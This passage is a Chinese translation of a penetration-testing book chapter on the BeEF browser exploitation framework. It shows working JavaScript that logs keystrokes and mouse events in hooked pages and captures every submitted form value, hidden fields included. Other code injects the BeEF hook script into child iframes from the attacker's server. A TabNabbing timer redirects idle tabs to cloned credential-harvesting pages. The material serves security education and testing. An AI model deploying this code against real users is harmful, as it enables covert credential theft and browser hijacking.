
BeEF的事件日志 默认情况下，BeEF 会自动记录本章中描述的所有事件类型。[Figure 5-4](#c05.html#figure5-4) 向您展示了多个键盘和鼠标事件的记录：开始图片  

[**Figure 5-4:**](#c05.html#figureanchor5-4) BeEF 中记录的键盘和鼠标事件  

![c05f004.tif](image_fi/662090c05/c05f004.png) 结束图片  

* * *

  end feature  

如果您能够控制 DOM，那么没有任何阻碍可以捕获所有鼠标事件类型，从而可能让您查看并记录鼠标光标在网站上的移动路径。DOM 还暴露了滚轮事件类型，因此您可以跟踪用户使用滚轮向上和向下滚动页面的情况。将这些事件组合在一起，技术上完全可以重建并监控用户在挂钩页面内执行的每一个操作。  

## 使用表单事件  

除了为所有键盘事件附加处理函数外，BeEF 还为所有 `<form>` 元素附加自定义逻辑。利用 jQuery 的元素选择器，以下代码在当前 DOM 中为所有表单元素附加 `beef.logger.submit()` 函数：  

```
$j('form').submit(
  function(e) { beef.logger.submit(e); }
);
```  

`beef.logger.submit()` 函数会遍历正在提交的表单，捕获所有表单输入字段及其值（包括隐藏字段），并将这些值发送回 BeEF 服务器：  

```
/**
 * Submit function fires whenever a form is submitted
 */
submit: function(e) {
  try {
    var f = new beef.logger.e();
    var values = "";
    f.type = 'submit';
    f.target = beef.logger.get_dom_identifier(e.target);
    for (var i = 0; i < e.target.elements.length; i++) {
      values += "["+i+"]";
      values +=e.target.elements[i].name;
      values +="="+e.target.elements[i].value+"\n";
    }
    f.data = 'Action: '+$j(e.target).attr('action');
    f.data += ' - Method: '+$j(e.target).attr('method');
    f.data += ' - Values:\n'+values;
    this.events.push(f);
  } catch(e) {}
}
```  

`beef.logger.e` 类定义了一个简单的事件结构，使得由鼠标或键盘生成的不同类型事件能够以统一的方式提交回 BeEF 服务器。函数中间的 for 循环遍历表单的子元素。请注意，前面的代码并未考虑 disabled 属性在表单字段中的情况。  

## 使用 Iframe 键盘记录  

将日志函数附加到当前 DOM 不仅局限于当前窗口。在同源策略（SOP）的约束下，JavaScript 可以将自身挂钩到其他 Iframe 里。DOM 通过其 `frames` 对象暴露当前文档中的所有帧。  

在 BeEF 实例化其 DOM 日志功能时，会遍历当前 DOM 中的帧，尝试在与当前挂钩来源同源的 Iframe 中重新挂钩每个子 Frame。随后，对任何已挂钩的子 Frame，这些 Frame 将包含 DOM 事件日志功能。执行此任务的函数是 `beef.browser.hookChildFrames()`，如下代码所示：  

```
/**
 * Hooks all child frames in the current window
 * Restricted by same-origin policy
 */
hookChildFrames:function () {

  // create script object
  var script  = document.createElement('script');
  script.type = 'text/javascript';
  script.src  = '<%== @beef_proto %>://<%== @beef_host %>:
    <%== @beef_port %><%== @hook_file %>';

  // loop through child frames
  for (var i=0;i<self.frames.length;i++) {
    try {
        // append hook script
        self.frames[i].document.body.appendChild(script);
    } catch (e) {
    }
  }
}
```  

该函数的第一部分创建新的 BeEF 挂钩脚本元素，最后部分遍历所有帧并尝试将脚本追加到子 Frame 的 body 中。  

除了自动挂钩所有子 Frame 外，BeEF 还提供一个独立的命令模块，实现类似功能。该模块名为“IFrame Event Logger”，适用于需要在当前窗口上方弹出一个覆盖 Iframe，并记录键盘输入但不一定需要完整 BeEF 挂钩的场景。  

在这一节中，您已经探索了作为攻击者可以拦截的多种事件处理例程，以监控用户的行为。随着浏览器不断引入新特性，新的事件处理机制也会随之出现。例如，移动设备的普及促使 W3C 引入触摸事件。随着流行浏览器 DOM 的不断演进，监控和攻击面会随之扩大。  

# 社交工程  

在第 2 章中，您已经体验了社交工程作为在目标浏览器中执行初始控制代码的有效方法。社交工程不必在此结束！您可以利用多种社交角度，进一步巩固对浏览器会话的控制。  

有时最简单的方法就是直接提问。在合法浏览会话中，精心构造的社交工程诱饵对许多用户来说很难避免。这些诱饵形式多样，包括假软件更新、假登录提示，甚至恶意插件提示。  

下面的章节讨论的技术大多超出浏览器范围，特别是那些诱使受害者运行可执行文件的技术。在系统可能已被补丁且安全的情况下，最简便的方法是利用用户的信任。  

## 使用 TabNabbing  

本章前面，您已经了解了通过 DOM 中的事件处理进行劫持的强大功能。一旦您理解用户如何与特定页面交互，就可以在用户不在当前窗口时进行操作。由于现今广泛使用的标签页，用户可能会在不同标签之间切换。一旦您捕获 blur 事件，就能轻松监测用户离开挂钩窗口的时间长度。下面的代码演示了此功能：  

```
var idle_timer;
begin_countdown = function() {
  idle_timer = setTimeout(function() {
    performComplicatedBackgroundFunction();
  }, 60000);
}
$j(window).blur(function(e) {
  begin_countdown();
}
$j(window).focus = function() {
  clearTimeout(idle_timer);
}
```  

这段代码定义了 `idle_timer` 变量和 `begin_countdown` 函数。执行后，`idle_timer` 会设置一个定时器，使得 60 秒后 `performComplicatedBackgroundFunction()` 被触发。该函数在窗口的 blur 事件中被调用。为了在用户返回标签页时停止计时器，`focus` 事件也被修改为清除定时器。  

TabNabbing 攻击的核心思想（最初由 Aza Raskin 提出）是改变您已控制的非活动标签的内容或位置。BeEF 的“TabNabbing”命令模块几乎包含完全相同的逻辑。默认情况下，该模块接受用户提供的两个参数：定时器等待时间以及重定向的 URL。此外，您还可以使用 `beef.browser.changeFavicon()` 函数更改网站的 favicon，以提升攻击效果。  

TabNabbing 攻击的一个典型用法是，将非活动标签的 URL 更改为 BeEF “Social Engineering”扩展（见第 2 章“使用社交工程攻击”部分）中克隆的网站 URL。这样，浏览器仍然保持对 BeEF 的挂钩，同时可以显示一个凭证采集页面。  

## 使用全屏  

